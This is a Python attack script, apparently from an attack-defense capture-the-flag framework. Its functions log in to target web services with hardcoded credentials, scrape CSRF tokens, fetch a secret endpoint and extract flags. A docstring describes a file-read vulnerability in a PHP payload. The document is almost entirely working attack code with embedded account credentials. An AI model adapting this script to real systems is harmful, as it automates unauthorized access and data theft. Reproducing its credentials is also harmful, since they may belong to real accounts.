#!/usr/bin/env python

import requests,re
from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:

    echo file_get_contents($_POST[444]);

    '''

    try:
        cmd = flag_path
        data = quote(cmd) 
        #res = http("get",target,target_port,"/bigbrother?filename="+data,'',headers)
	res = shit2(target,target_port)
        # Even though we can not execute the cmd with the vuln, but we can read flag
        # and we want to use our framework to carry out this attack
        # not do the replicate tasks to code a new script
        flag_pattern = '(hctf{[a-z0-9]+})'
        tmp = re.search(flag_pattern,res)
        if tmp:
            res = tmp.group()
            res = cmd_prefix + res + cmd_postfix
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res

def shit(target,target_port):
    ip = target
    url = 'http://%s/login/sso' % ip
    f = 'http://%s/getSecret/' % ip
    match_flag = re.compile('(hctf{[a-z0-9]+})')
    data = {'username': 'Team09', 'password': 'c8409587-df58-11e7-8e4a-4a000086a860'}
    s = requests.Session()
    u = s.get('http://'+ip+'/login/sso').url
    s.post(u, data=data)
    tmp = s.get(f).content
    print tmp
    d = match_flag.findall(tmp)
   
    if d:

        return d[0]
	print(d[0])

    return "get flag error"

def shit2(target,target_port):
    ip = target
    f = 'http://%s/getSecret/' % ip
    match_flag = re.compile('(hctf{[a-z0-9]+})')
    url = 'http://%s/login' % ip
    match_token = re.compile('<meta name="csrf-token" content="([a-z0-9A-Z]+)">')
    s = requests.Session()
    t = s.get(url).content
    token = match_token.findall(t)
    if token:
        data = {
                'email': 'aklis@vidar.club',
                'password': '951b805d411a121eb33fefdfca075f65f9b82b32435ed4d7cb10f515b6a44b9e',
                '_token': token[0],
        }
        s.post(url, data)
        d = match_flag.findall(s.get(f).content)
        if d:
            print(d[0])
	    return d[0]

